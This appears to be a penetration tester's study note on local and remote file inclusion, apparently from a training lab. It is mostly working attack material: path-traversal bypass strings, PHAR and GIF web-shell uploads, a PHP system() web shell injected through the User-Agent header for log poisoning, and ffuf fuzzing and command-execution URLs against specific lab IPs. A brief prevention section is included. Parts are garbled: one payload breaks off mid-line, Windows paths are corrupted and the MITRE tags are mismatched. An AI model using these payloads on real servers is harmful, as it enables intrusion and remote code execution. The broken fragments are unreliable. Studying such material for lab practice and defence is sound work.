---
title: file-inclusion
aliases: []
tags:
- technique/path-traversal
category: techniques
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: file-inclusions.md
related_tools:
- '[[burpsuite]]'
- '[[ffuf]]'
- '[[liffy]]'
- '[[lfisuite]]'
- '[[lfifreak]]'
- '[[curl]]'
- '[[system]]'
related_techniques:
- '[[t1190]]'
- '[[t1555-004]]'
- '[[t1190]]'
- '[[t1089]]'
- '[[t1003]]'
- '[[t1132]]'
related_tactics:
- '[[t1003-003]]'
- '[[t1555]]'
- '[[t1089]]'
related_services:
- '[[http]]'
- '[[https]]'
- '[[ftp]]'
- '[[smb]]'
- '[[apache]]'
- '[[nginx]]'
- '[[ssh]]'
related_os:
- '[[etc-passwd]]'
- '[[C:\Windows\boot.ini]]'
- '[[/var/log/apache2/access.log]]'
- '[[/var/log/nginx/]]'
- '[[/var/log/sshd.log]]'
- '[[/var/log/mail]]'
- '[[/var/log/vsftpd.log]]'
- '[[etc-apache2-apache2-conf]]'
- '[[/etc/apache2/envvars]]'
- '[[/var/log/nginx/access.log]]'
- '[[/flag_dacc60f2348d.txt]]'
related_notes: []
mitre_tactic: TA0506
mitre_technique: T1568.001
real_path: ''
port: ''
protocol: ''
os: ''
---

# file-inclusion

## File Inclusion
File inclusion vulnerabilities can be exploited to include local or remote files, leading to code execution. This section covers various types of file inclusion, including local file inclusion (LFI), remote file inclusion (RFI), and file uploads.

### Local File Inclusion (LFI)
LFI vulnerabilities allow attackers to include local files, such as configuration files, by manipulating the input parameters. Commonly vulnerable functions include `include()`, `include_once()`, `require()`, `require_once()`, and `file_get_contents()`. Examples in PHP, Node.js, Express.js, Java, and .NET are provided.

#### Basic Bypasses
- **String Replacement**: Basic filters like `str_replace('../', '', $_GET['language'])` can be bypassed using `....//` or `..%2F..%2F..%2F..%2Fetc%2Fpasswd`.
- **Encoding**: URL encoding can be used to bypass filters, e.g., `%2e%2e%2f` or `..%2F..%2F..%2F..%2Fetc%2Fpasswd`.
- **Approved Paths**: Regular expressions can be used to restrict paths, e.g., `preg_match('/^\.\/languages\/.*$/', $_GET['language'])`.
- **Null Bytes**: Null bytes can terminate strings in older PHP versions, e.g., `/etc/passwd%00`.

### Remote File Inclusion (RFI)
RFI vulnerabilities allow attackers to include remote files, leading to potential code execution. This can be tested by including a local file or a web server.

#### Testing for RFI
- **Quick Test**: `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`
- **Process**: 
  - **HTTP**: Create a web shell, run a Python HTTP server, and execute the inclusion.
  - **FTP**: Create a web shell, run a Python FTP server, and execute the inclusion.
  - **SMB**: Create an SMB server and use a UNC path for inclusion.

### File Uploads
File uploads can be used to include malicious files, such as images or ZIP files, containing PHP code. Examples include uploading a GIF with embedded PHP code or a ZIP file with a PHAR archive.

#### Examples
- **Malicious Image**: `echo 'GIF8<?php system($_GET[

File inclusion is a technique that allows attackers to include and execute files from the server's file system. This can be done through various methods, including Remote File Inclusion (RFI) and Local File Inclusion (LFI). The following steps demonstrate how to exploit LFI vulnerabilities:

- **Compiling and Renaming the Shell File**: 
  ```bash
  $phar->stopBuffering();
  ```
  ```bash
  - compile and rename file to shell.jpg `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
  ```
- **Executing the Shell**: 
  ```bash
  - execute `http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`
  ```

- **Log Poisoning**: 
  If any file containing PHP code is included, it will be executed as long as the function has execute privileges.
  - **PHP Session Poisoning**: 
    - PHPSESSID cookies
    - Session files are located in `/var/lib/php/sessions/` on Linux and `C:	emp	emp` on Windows.
    - Example: 
      ```bash
      - `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`
      ```
  - **Server Log Poisoning**: 
    - Apache logs are located in `/var/log/apache2/` on Linux and `C:
ginx
ginx.conf` on Windows.
    - Example: 
      ```bash
      - `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id`
      ```
  - **Automated Scanning**: 
    - Fuzzing parameters: 
      ```bash
      - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`
      ```
    - LFI wordlists: 
      ```bash
      - `ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`
      ```
    - Server webroot: 
      ```bash
      - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 228`
      ```
    - Server logs/configs: 
      ```bash
      - `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`
      ```
  - **File Inclusion Prevention**: 
    - Avoid passing any user-controlled inputs into file inclusion functions.
    - Sanitize user input.
    - Use whitelisting for safe values.
    - Use built-in functions like `basename()` to prevent directory traversal.
    - Web server configuration: 
      - Disable `allow_url_fopen` and `allow_url_include`.
      - Add `open_basedir = /var/www` in `php.ini`.
      - Disable dangerous modules like `PHP Expect mod_userdir`.
    - Web application firewalls (WAF): 
      - Use ModSecurity in permissive mode to minimize false positives.

## Description
This chunk describes the use of a PHP alternative shell and HTTP requests to exploit a Local File Inclusion (LFI) vulnerability. The PHP code snippet is used to execute shell commands, and the HTTP requests are crafted to exploit the vulnerability.

## PHP Alternative Shell
```php
<?php $output = shell_exec('ls'); echo '<pre>$output</pre>'; ?>
```

## HTTP Requests
The following HTTP requests are used to exploit the LFI vulnerability:

```sh
curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -o graceful

ffuf -w graceful:FUZZ -u 'http://94.237.51.163:50363/ilf_admin/index.php?log=../../../../../FUZZ' -fs 2046,3269,3478,3480,2358 -fw 245

- `echo -n 'User-Agent: <?php system($_GET[\'cmd\']); ?>' > Poison`
- `curl -s 'http://94.237.59.174:49303/index.php' -H @Poison`

http://94.237.51.163:50363/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log
http://94.237.59.174:49303/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls /
http://94.237.59.174:49303/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat+/flag_dacc60f2348d.txt
```

## References
- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion
- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
- https://github.com/D35m0nd142/LFISuite
- https://github.com/OsandaMalith/LFiFreak
- https://github.com/mzfr/liffy
- https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
- https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux
- https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows

